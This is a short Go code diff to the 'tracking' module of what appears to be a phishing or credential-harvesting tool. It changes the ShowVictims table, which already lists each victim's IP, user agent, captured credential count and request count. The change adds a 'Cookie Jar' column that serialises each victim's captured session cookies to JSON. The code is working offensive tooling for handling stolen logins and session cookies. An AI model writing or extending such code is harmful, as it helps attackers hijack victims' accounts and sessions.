@@ -1,6 +1,7 @@
 package tracking
 
 import (
+	"encoding/json"
 	"fmt"
 	"os"
 	"strconv"
@@ -95,6 +96,7 @@ func (module *Tracker) ShowVictims() {
 		"UA",
 		"# Credentials",
 		"# Requests",
+		"Cookie Jar",
 	}
 
 	var rows [][]string
@@ -102,8 +104,22 @@ func (module *Tracker) ShowVictims() {
 		_, vv := k.(string), v.(*Victim)
 
 		if len(vv.Credentials) > 0 {
+
+
+			m := map[string]interface{}{}
+			vv.Cookies.Range(func(key, value interface{}) bool {
+				m[fmt.Sprint(key)] = value
+				return true
+			})
+
+			b, err := json.MarshalIndent(m, "", " ")
+			if err != nil {
+				module.Error("%+v", err)
+				b = []byte{}
+			}
+
 			rows = append(rows, []string{tui.Bold(vv.ID), vv.IP, vv.UA, strconv.Itoa(len(vv.Credentials)),
-				strconv.Itoa(vv.RequestCount)})
+				strconv.Itoa(vv.RequestCount), string(b)})
 		}
 		return true
 	})
